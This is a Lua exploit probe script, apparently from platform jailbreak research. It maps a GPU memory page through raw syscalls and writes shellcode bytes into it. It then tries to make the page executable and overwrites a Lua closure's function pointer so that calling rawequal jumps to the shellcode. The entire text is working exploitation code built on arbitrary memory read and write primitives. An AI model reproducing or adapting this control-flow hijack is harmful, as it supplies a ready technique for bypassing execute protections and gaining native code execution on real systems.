-- CRASH_CLASS: HIGH
-- PROBE 573a: the same exec test on a real GPU mmap (prot 0x33, fd 0x1002),
-- the mapping 43h/44a were written for. Reached through the validated
-- CClosure redirect, not fn_addr.

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end

print("=== PROBE 573a: GPU PAGE EXEC ===")
local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end
print(string.format("[0] pid=%d", pid))

local sc_mmap = mk(477)
local sc_mtypeprotect = mk(585)
local PS = 0x4000
local ok, page = pcall(function()
    return sc_mmap(uint64(0), uint64(PS), uint64(0x33), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print(string.format("[1] gpu mmap ok=%s page=%d", tostring(ok), N(page)))
local P = N(page)
if P == 0 then print("FATAL"); return end

wb(P, 0x31); wb(P + 1, 0xC0); wb(P + 2, 0xC3)
print(string.format("[2] wrote %02X %02X %02X at %d", rd(P) % 256, math.floor(rd(P) / 256) % 256, math.floor(rd(P) / 65536) % 256, P))
local okp, rvp = pcall(function() return sc_mtypeprotect(uint64(P), uint64(PS), uint64(7)) end)
print(string.format("    mtypeprotect rwx ok=%s rv=%s", tostring(okp), tostring(rvp)))

local s = tostring(rawequal)
local astr = s:match(": ([0-9a-fA-F]+)$")
local cc = tonumber(astr, 16)
print(string.format("[3] closure=%d fn=%s", cc, tostring(rq(cc + 0x20))))
local saved = rq(cc + 0x20)
pcall(function() memory.write_qword(cc + 0x20, uint64(P)) end)
print("[A] redirect to the GPU page and call")
local okA, a1 = pcall(rawequal, 1, 2)
pcall(function() memory.write_qword(cc + 0x20, saved) end)
print(string.format("    ok=%s a1=%s alive=%s", tostring(okA), tostring(a1), tostring(alive())))
